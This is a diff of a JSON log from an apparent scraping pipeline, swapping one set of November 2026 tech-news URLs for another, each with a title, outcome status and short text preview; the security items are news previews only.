@@ -1,65 +1,11 @@
 [
   {
-    "url": "https://arxiv.org/abs/2610.14162",
-    "title": "Next-Concept Modeling: Fast, Parallel Coarse-to-Fine Text Generation",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 456,
-      "source_preview": "arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website. Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them. Have an idea for a project that will add v",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://ketchup3d.github.io/app/",
-    "title": "KetchUp – Open-source SketchUp alternative built with Rust and WebGPU",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2700,
-      "source_preview": "BenchUp is a free, open-source 3D modeling app for woodworking and furniture design. Plan a shelf, table, cabinet, or workbench with exact measurements before you build. Use it on Windows, macOS, Linux, or right in your desktop browser. Release notes & all downloads ↗ Free & open source. No account needed. Made for a desktop browser and a mouse. Start with a simple shape. Keep the tools you need c",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://shubs.io/unlocking-any-car-from-x-brand-in-most-of-the-world/",
-    "title": "Unlocking any car from X brand in most of the world",
+    "url": "https://strandsagents.com/blog/amazon-saves-millions-replacing-sonnet-with-strands-decider/",
+    "title": "Amazon saves millions by replacing Sonnet 4.6 with Strands Decider",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Co-founder of Assetnote, security researcher. I've always had a soft spot for this particular car brand. Our family has owned a few of them over the years, and they've served us incredibly well. In 2023, I bought a new four wheel drive/SUV from them, and it was the first time I had access to their connected car platform. Having looked at platforms like this before ( previous works ), I was sceptic",
+      "source_preview": "Two Amazon engineers swapped Claude Sonnet 4.6 for a decision model in one of the world's biggest internal ticketing systems. For a while, Amazon and AWS teams relied on Claude Sonnet 4.6 to label tickets in an internal system\nwithout breaking the bank. Sonnet 4.6 fit the goldilocks choice of balancing intelligence with cost. Considering it dealt with one\nof the world’s largest internal ticketing ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -81,12 +27,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://matteoraso.github.io/im-not-convinced-the-ai-bubble-exists.html#im-not-convinced-the-ai-bubble-exists",
-    "title": "I'm not convinced the AI bubble exists",
+    "url": "https://www.anthropic.com/claude-fable-and-mythos-5-2",
+    "title": "Claude Fable 5.2 and Mythos 5.2",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posted on Sun 08 November 2026 in AI The AI bubble is a speculative concept that the AI industry is extremely over-valued. If true, the value of most companies involved in AI (several of whom are worth well over a trillion dollars) will collapse, devastating the entire economy. If you check any online discussion about the financial situation of the AI industry, it's essentially taken for granted t",
+      "source_preview": "November 9, 2026 We’ve upgraded Claude Fable and Claude Mythos—models that are designed to tackle the most daunting technical challenges. Claude Fable 5.2 and Claude Mythos 5.2 show improvements in areas like coding, reasoning, and vision. During prerelease testing they’ve helped our engineers complete otherwise-infeasible software migrations, designed three working electronic devices from scratch",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -108,12 +54,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://pixelos.net/",
-    "title": "PixelOS",
+    "url": "https://postalpro.usps.com/zcb",
+    "title": "USPS now offers official ZIP Code boundary polygons",
     "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 230,
-      "source_preview": "PixelOS is an AOSP based ROM, with Google apps included and all Pixel goodies. We aim to provide an experience similar to Google Pixel phones with numerous performance enhancements and a small amount of useful additional features.",
+      "scraped_chars": 1001,
+      "source_preview": "USPS Mailing Services team provides strategic incentives, offering various benefits and advantages to businesses and individuals. All Mail Incentives Mail Growth Incentive USPS Mailing Promotions seek to increase engagement and response rates for Mailers by leveraging high value mailpieces. USPS® ZIP Code Boundaries is a national ZIP Code™ map utilizing USPS delivery address and location informati",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -135,39 +81,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://twitter.com/shanemelaugh/status/2119192075505893695",
-    "title": "Is Opus 5.5 nerfed? Thinking patterns changed on November 3",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 46,
-      "source_preview": "See what’s happening and join the conversation",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://psalm.dev/articles/psalm-7",
-    "title": "Psalm 7 release: PHP security&static analysis software",
+    "url": "https://simonwillison.net/2026/Nov/9/mysterious-beeps/",
+    "title": "Locating the source of a mysterious beep",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Psalm November 2, 2026 by Daniil Gentili - 10 minute read Cross-posted from Daniil Gentili's blog » . Announcing the release of Psalm 7! Featuring a simply enormous number of new features and bug fixes, such as: Psalm 7 runs on 64-bit PHP 8.2 to 8.6. Upgrading is simple for most projects: see Upgrading below. Taints are now stored as a bitmask, and the taint graph is resolved over compact summarie",
+      "source_preview": "9th November 2026 Our house has a box room, full of boxes that we still haven’t unpacked from our last move. A couple of weeks ago something in that room started intermittently beeping . The beeps were far enough apart that standing in the room and trying to determine the source of the noise was frustrating, and I really didn’t want to dig through every one of those boxes. So I had Claude Code bui",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -189,39 +108,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://duxlabs.dev/",
-    "title": "Dux: Free, open-source Wayland desktop shell with file manager and theming",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 1278,
-      "source_preview": "Beautiful, functional, and ready to use Experience the fluid interface and beautiful animations Media controls, weather, calendar, and system info at a glance Effortlessly control your audio, displays, network, and bluetooth Personalize your desktop experience Extend functionality with new widgets, launcher features, and more. A complete desktop experience, out of the box A modern and beautiful de",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/2026/11/08/is-jensen-huangs-job-on-the-line-yales-jeffrey-sonnenfeld-estimates-its-about-a-50-50/",
-    "title": "Is Jensen Huang’s job on the line? Yale’s Jeffrey Sonnenfeld estimates it’s “about a 50-50”",
+    "url": "https://www.notion.com/help/security-incident-involving-a-third-party-ai-vendor",
+    "title": "Fireworks AI security breach impacts Notion and their customers",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Nvidia’s board announced Sunday that it’s launching an independent investigation after CEO Jensen Huang told staff he was unfaithful to his wife. But this isn’t a case of just another CEO having an extramarital affair. The romantic interest is Megaspeed executive Alice Huang, whom U.S. officials believe is a Chinese spy who was feeding information back to Beijing. In short, the stakes reach well b",
+      "source_preview": "This notice is about the security incident at one of our vendors, Fireworks AI, that may impact some Notion workspaces. For the latest on the Fireworks AI incident, see their official security updates here . Following an investigation by the Notion security team, we have determined that <1% of Notion workspaces may have been affected by the Fireworks security incident. Some unattributable chat ses",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -243,12 +135,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/08/apps-to-distract-you-from-the-endless-cycle-of-doomscrolling/",
-    "title": "Apps to distract you from the endless cycle of doomscrolling",
+    "url": "https://www.payments.ca/canada-launches-real-time-rail-bringing-247-payment-infrastructure-national-economy",
+    "title": "Payments Canada announces launch of Canada's Real-Time Rail (RTR) payment system",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "You open your phone to check the time or a quick message. The next thing you know, an hour has passed and you’ve scrolled through endless celebrity drama, cat videos, awful news stories, influencer rants, and whatever else the algorithm decided to throw at you. Even though you probably don’t want to keep wasting your time and energy on this mind-numbing content, you do it again the next day. Dooms",
+      "source_preview": "The new system will enable participating financial service providers to clear and settle payments in real time, providing a made-in-Canada platform for future innovation and prosperity. OTTAWA, ON, November 9, 2026 – Payments Canada today announced the launch of Canada’s Real-Time Rail (RTR). This new national payment system will transform day-to-day payments for Canadian businesses and consumers ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -270,12 +162,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/08/if-snaps-specs-are-still-ridiculously-expensive-theyre-also-a-lot-more-comfortable-than-they-used-to-be/",
-    "title": "If Snap’s Specs are still ridiculously expensive, they’re also a lot more comfortable than they used to be",
+    "url": "https://www.foldableflight.com",
+    "title": "Foldable Flight: The Best Paper Airplanes",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "When I tried a prototype of Snap’s Specs at CES in Las Vegas earlier this year, the experience left something to be desired. The company’s AR glasses — which the company calls a “new kind of computer” — were heavy (they weighed around 8 ounces) and fit rather uncomfortably on my face. The device was also hot, and made my face feel tingly — a common side-effect of smart glasses where massive comput",
+      "source_preview": "Paper Type Airplanes match your search. 109 Try one of our recommended planes! Click on any plane to fold it! Speed: 5 Intermediate Glide: 10 4 Accuracy: This World Record prototype can fly over 300 feet!!! Click on any plane to fold it! Speed: 2 Intermediate Glide: 10 4 Accuracy: Unite holds the world record for time aloft at 31.2 seconds! Click on any plane to fold it! Speed: 7 Easy Glide: 5 6 A",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -297,12 +189,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/08/coordinated-disturbances-haunt-grids-worldwide-heres-how-researchers-solved-the-mystery/",
-    "title": "Coordinated disturbances haunt grids worldwide. Here’s how researchers solved the mystery.",
+    "url": "https://www.technologyreview.com/2026/11/09/1148194/the-backlash-about-data-centers-might-really-just-be-about-electricity/",
+    "title": "The backlash about data centers might really just be about electricity",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "For years, mysterious electrical anomalies have been flummoxing grid managers around the world. Every 60 seconds, the frequency on the grid would drop a tiny bit. Even weirder: The sags happened at the exact same time on power grids across countries and continents. It was a mystery that Dirk Witthaut, a researcher at Forschungszentrum Jülich in Germany, couldn’t pass up. Germany’s largest transmis",
+      "source_preview": "Big Tech sees a culture war over progress. But the real fault line is electricity: drawing it from the grid and generating it onsite provoke different kinds of backlash, neither easily solved by public relations. This story originally appeared in The Algorithm, our weekly newsletter on AI. To get stories like this in your inbox first, sign up here . As voters went to the polls across the US last w",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -324,12 +216,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/08/the-ex-secret-service-agent-who-flipped-a-hacker-is-now-raising-a-second-250m-cybersecurity-fund/",
-    "title": "He arrested a hacker, then spent 18 months clearing his own name. Now he’s a cybersecurity VC.",
+    "url": "https://www.technologyreview.com/2026/11/09/1148182/nancy-pelosis-replacement-is-ready-to-regulate-ai/",
+    "title": "Nancy Pelosi’s replacement is ready to regulate AI",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Every time venture capitalists write a check, they’re secretly running numbers in their heads about different exit scenarios. It’s their job as fiduciaries. But nearly all will tell you (publicly, anyway) that every portfolio company is headed for an IPO. Stephen Ward, the co-founder of Brightmind Partners , a two-year-old cybersecurity fund in New York, says otherwise outright. “You have to sell ",
+      "source_preview": "Scott Wiener has made AI regulation a cornerstone of his political career. Now he’s headed to Congress. As a California state senator, Scott Wiener authored legislation aimed at curbing the risks of advanced AI. Now, after winning a tight congressional race for former Speaker of the House Nancy Pelosi’s open San Francisco seat, he could play a key role in setting federal AI policy. I spoke with Wi",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -351,12 +243,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/08/techcrunch-mobility-the-cybertruck-experiment-is-over/",
-    "title": "TechCrunch Mobility: The Cybertruck experiment is over",
+    "url": "https://www.technologyreview.com/2026/11/09/1148176/the-download-empty-ai-climate-claims-and-an-nvidia-investigation/",
+    "title": "The Download: empty AI climate claims, and an Nvidia investigation",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Welcome back to TechCrunch Mobility , your hub for the future of transportation and now, more than ever, the role AI is playing in it. To get this in your inbox, sign up here for free — just click TechCrunch Mobility ! Almost seven years ago, while clutching a laptop, my phone, and a notebook in a sea of Tesla fans, I watched head designer Franz von Holzhausen throw a metal, baseball-sized ball at",
+      "source_preview": "Plus: Democrats are planning a blitz of investigations into Big Tech. This is today's edition of The Download , our weekday newsletter that provides a daily dose of what's going on in the world of technology. —By Mary Nichols, distinguished counsel at the UCLA School of Law and the former chair of the California Air Resources Board, and Jeremy Tamanini, the founder of Dual Citizen, a sustainabilit",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -378,12 +270,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/08/ninjas-autobarista-is-impressively-versatile-but-one-feature-was-a-dealbreaker-for-me/",
-    "title": "Ninja’s AutoBarista is impressively versatile, but one feature was a dealbreaker for me",
+    "url": "https://www.technologyreview.com/2026/11/09/1147654/innovating-with-ai-in-the-special-chemicals-industry/",
+    "title": "Innovating with AI in the special chemicals industry",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "I’ve made about a dozen different kinds of coffee drinks with the Ninja AutoBarista , and I have absolutely no idea what sort of grind size, tamping pressure, water temperature, or extraction timing is necessary to pull espresso shots for any of those drinks. The AutoBarista takes care of these considerations for you, making it possible to brew 13 different drinks with just the press of a button. ",
+      "source_preview": "Sponsored Connected data, AI, and advanced modeling are helping scientists accelerate research and develop more sustainable materials. In partnership with Infosys As companies look to accelerate innovation with artificial intelligence, cloud computing, and advanced modeling, the primary challenge is connecting new technologies to reliable data, scientific expertise, and the practical realities of ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -405,12 +297,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/ai-artificial-intelligence/1029595/full-text-jensen-huang-affair-memo-nvidia",
-    "title": "Here’s the full text of Jensen Huang’s memo to Nvidia",
+    "url": "https://techcrunch.com/2026/11/09/otter-ai-can-now-follow-conversations-across-30-languages/",
+    "title": "Otter AI can now follow conversations across 30+ languages",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech In the memo Nvidia’s CEO acknowledges having an affair with a suspected Chinese spy. In the memo Nvidi",
+      "source_preview": "Otter.ai, the AI-powered note-taking tool, announced Tuesday that it’s expanding its multilingual capabilities, including a new multilingual transcription feature that can follow conversations as speakers switch between languages during the same meeting. The company is also adding support for 27 languages, its largest language expansion to date. Once the rollout is complete, Otter will support 31 ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -432,12 +324,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/entertainment/1029579/soul-glo-diaspora-problems-hardcore-punk-review",
-    "title": "Soul Glo’s Diaspora Problems is a hardcore record like no other",
+    "url": "https://techcrunch.com/2026/11/09/californias-proposed-billionaire-tax-fails-to-pass/",
+    "title": "California’s proposed ‘billionaire tax’ fails to pass",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment Posts from this topic will be added to your daily email digest and your homepage feed. See All Column Posts from this topic will be added to your daily email digest and your homepage feed. See All Music Diaspora Problems is one of the 21st century’s best punk albums. Posts from this author ",
+      "source_preview": "California voters have rejected Proposition 40, the state’s proposed one-time tax on billionaires, the Associated Press reported Monday . The measure failed after an expensive campaign that pitted labor unions against some of tech’s wealthiest figures. It was also opposed by Gov. Gavin Newsom. Nic Carter lives about as far from Silicon Valley as you can get within the continental U.S. but his feel",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -459,12 +351,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/games/1029557/epic-games-launcher-is-coming-to-steamos",
-    "title": "Epic Games Launcher is coming to SteamOS",
+    "url": "https://techcrunch.com/2026/11/09/jensen-huang-reportedly-engaged-a-pr-firm-with-a-history-of-handling-high-profile-sex-scandals-a-year-ago/",
+    "title": "Jensen Huang reportedly engaged a PR firm with a history of handling  high-profile sex scandals a year ago",
     "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 2383,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gaming Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Fortnite Epic Games confirmed that its Linux launcher will officially support SteamOS and Steam Decks. ",
+      "scraped_chars": 2088,
+      "source_preview": "Posted: Nvidia CEO Jensen Huang hired Heller Inc., a crisis communications firm known for handling sex scandals, at least a year before he publicly acknowledged an extramarital affair with a woman suspected of spying for China, Wired reported . Heller Inc. founder Risa Heller has advised prominent men through personal scandals and sexual misconduct accusations, according to a 2023 New York Magazin",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -486,39 +378,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/ai-artificial-intelligence/1029552/apple-siri-ai-agentic",
-    "title": "Apple is racing to make Siri more agentic",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2928,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Future versions of Siri will be able to control third-party apps and perform more complex tasks. Futur",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/ai-artificial-intelligence/1029533/elvis-eminem-suno-ai-music-clone-lawsuit",
-    "title": "Elvis and Eminem rights holders are suing Suno",
+    "url": "https://techcrunch.com/2026/11/09/hotel-giant-wyndham-exposed-customer-data-after-app-security-lapse/",
+    "title": "Hotel giant Wyndham exposed customer data after app security lapse",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment Posts from this topic will be added to your daily email digest and your homepage feed. See All News Suno is facing two more lawsuits over AI music clones. Suno is facing two more lawsuits over ",
+      "source_preview": "Hotel and resort giant Wyndham has acknowledged a cybersecurity incident after a good-faith security researcher discovered a bug that allowed anyone to access customers’ personal information. Security researcher Robert Wiggins at What Security exclusively told TechCrunch that he found a password inside the source code of Wyndham’s Android app, which granted access to an internal company database, ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -540,12 +405,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/gadgets/1029019/apple-macbook-air-13-15-inch-m5-deal-sale",
-    "title": "Apple’s M5 MacBook Air is down to its lowest price since July",
+    "url": "https://techcrunch.com/2026/11/09/fervo-now-has-12b-in-orders-for-its-geothermal-power-tech/",
+    "title": "Fervo now has $12B in orders for its geothermal power tech",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Apple You can get a temporary break from the $200 price hike that hit both Air sizes this summer. You ",
+      "source_preview": "Geothermal company Fervo couldn’t have picked a better time to deliver its first power plants. In its third-quarter earnings report, released Monday, the company said it now has $11.9 billion worth of contracted revenue on the books, up from $7.2 billion last quarter. Fervo has been hitting its deadlines recently, which undoubtedly has helped to drive orders. As hyperscalers scour the earth for el",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -567,12 +432,66 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/column/1026252/video-media-news-tiktok-pivot",
-    "title": "There’s no slowing down media’s pivot-to-video 2.0",
+    "url": "https://www.theverge.com/gadgets/1030262/msi-mag-272qp-qd-oled-x24-monitor-woot-deal-sale",
+    "title": "MSI’s refurbished QD-OLED gaming monitor is on sale for under $300",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2533,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Gaming Posts from this topic will be added to your daily email digest and your homepage feed. See All PC Gaming The 1440p, 240Hz panel offers a potentially sizable upgrade from older IPS panels. The 144",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/tech/1030084/apple-intelligence-usage-packs-ai-features-creator-studio-logic-pro",
+    "title": "Apple’s $50 Intelligence Usage Packs extend access to some AI features",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2786,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Logic Pro is Apple’s first app to charge for extended usage of Apple Intelligence.﻿ Logic Pro is Apple",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/gadgets/1029998/game-pass-ultimate-three-months-lego-pokemon-pikachu-deal-sale",
+    "title": "You can grab three months of Game Pass Ultimate for under $20 per month",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Column Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Social Media Just as publishers are starting to crack the vertical video code, social media platforms a",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Gaming Posts from this topic will be added to your daily email digest and your homepage feed. See All PC Gaming We also spotted discounts on a capable Ryzen 7 CPU, the Lego Pokémon Pikachu set, and a Bo",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -594,13 +513,80 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://openai.com/index/australian-universities-ai-native-graduates",
-    "title": "Australian universities are creating AI-native graduates",
+    "url": "https://www.theverge.com/tech/1030061/instagram-ai-effect-builder-filters",
+    "title": "Instagram’s Effect Builder makes new filters from AI prompts",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2814,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News The Effect Builder bot is available on the web to build whatever new Instagram filters you can think o",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://openai.com/index/closing-ai-guidance-gap-education",
+    "title": "Closing the AI guidance gap in education",
     "outcome": "skipped_no_content",
     "stage0": {
       "scraped_chars": 0,
       "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/australian-universities-ai-native-graduates"
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/closing-ai-guidance-gap-education"
+    }
+  },
+  {
+    "url": "https://openai.com/index/chatgpt-enterprise-aws-marketplace",
+    "title": "ChatGPT Enterprise now available in AWS Marketplace",
+    "outcome": "skipped_no_content",
+    "stage0": {
+      "scraped_chars": 0,
+      "source_preview": "",
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/chatgpt-enterprise-aws-marketplace"
+    }
+  },
+  {
+    "url": "https://openai.com/index/control-room",
+    "title": "Control Room: A central system to track and stop model workloads across our research infrastructure",
+    "outcome": "skipped_no_content",
+    "stage0": {
+      "scraped_chars": 0,
+      "source_preview": "",
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/control-room"
+    }
+  },
+  {
+    "url": "https://openai.com/index/coderabbit-codex-daybreak",
+    "title": "CodeRabbit scales agentic software development and ships 20x more",
+    "outcome": "skipped_no_content",
+    "stage0": {
+      "scraped_chars": 0,
+      "source_preview": "",
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/coderabbit-codex-daybreak"
+    }
+  },
+  {
+    "url": "https://openai.com/index/kuken",
+    "title": "Kuken Industries searches 70 years of drawings in minutes",
+    "outcome": "skipped_no_content",
+    "stage0": {
+      "scraped_chars": 0,
+      "source_preview": "",
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/kuken"
     }
   },
   {
@@ -614,86 +600,12 @@
     }
   },
   {
-    "url": "https://openai.com/index/merge-builds-with-openai",
-    "title": "Merge builds product and business tools with OpenAI technology",
-    "outcome": "skipped_no_content",
-    "stage0": {
-      "scraped_chars": 0,
-      "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/merge-builds-with-openai"
-    }
-  },
-  {
-    "url": "https://openai.com/ads/customers/flipsnack",
-    "title": "Flipsnack grows product signups with conversion optimization",
-    "outcome": "skipped_no_content",
-    "stage0": {
-      "scraped_chars": 0,
-      "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/ads/customers/flipsnack"
-    }
-  },
-  {
-    "url": "https://github.com/RapidSailorFreeze/studsmith",
-    "title": "RapidSailorFreeze/studsmith",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 1196,
-      "source_preview": "Free AI agent for Roblox Studio: plans, writes Luau, shows a diff and playtests its own changes. Windows app. 免费的 Roblox Studio AI 智能体。 English · 简体中文 Studsmith is a free Windows app that helps you build Roblox games faster. Describe what you want in plain language, and the agent writes the Luau scripts, sets things up in your game and explains what it changed. Download for Windows Requires Window",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://github.com/quyetcao/ai-manus",
-    "title": "quyetcao/ai-manus",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2820,
